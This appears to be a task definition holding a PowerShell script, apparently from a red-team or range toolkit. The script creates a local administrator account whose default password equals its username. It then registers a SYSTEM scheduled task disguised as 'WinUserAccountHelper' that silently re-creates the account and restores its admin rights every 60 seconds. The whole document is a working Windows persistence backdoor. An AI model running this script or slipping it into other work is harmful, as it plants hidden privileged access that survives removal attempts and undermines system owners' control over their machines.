name: priv-user-respawn-win
description: [2026-11-18 fix: schtasks-based registration; Register-ScheduledTask duration=MaxValue is out of range XML on Server 2022]
script:
# SYSTEM scheduled task re-asserting a local admin every 60 seconds.
if (-not $ADMIN_USER) { $ADMIN_USER = 'svc_helper' }
if (-not $ADMIN_PASSWORD) { $ADMIN_PASSWORD = $ADMIN_USER }
$arg = "/c net user $ADMIN_USER $ADMIN_PASSWORD /add 2>nul & net user $ADMIN_USER $ADMIN_PASSWORD >nul & net localgroup Administrators $ADMIN_USER /add >nul"
# schtasks registers the 60-second indefinite cycle reliably across Windows
# builds (Register-ScheduledTask rejects [TimeSpan]::MaxValue durations with
# out-of-range XML). The task runs cmd every 60 s as SYSTEM.
$cmdarg = 'net user ' + $ADMIN_USER + ' ' + $ADMIN_PASSWORD + ' /add 2>nul & net user ' + $ADMIN_USER + ' ' + $ADMIN_PASSWORD + ' >nul & net localgroup Administrators ' + $ADMIN_USER + ' /add >nul'
# Create the account immediately too: downstream group-adds must not depend
# on the task's first tick.
cmd.exe /c "net user $ADMIN_USER $ADMIN_PASSWORD /add" >nul 2>nul
cmd.exe /c "net localgroup Administrators $ADMIN_USER /add" >nul 2>nul
& schtasks.exe /Create /F /TN 'WinUserAccountHelper' /SC MINUTE /MO 1 /RU 'SYSTEM' /TR ('cmd.exe /c ' + $cmdarg) | Out-Null
Write-Output "respawn task WinUserAccountHelper registered for $ADMIN_USER"
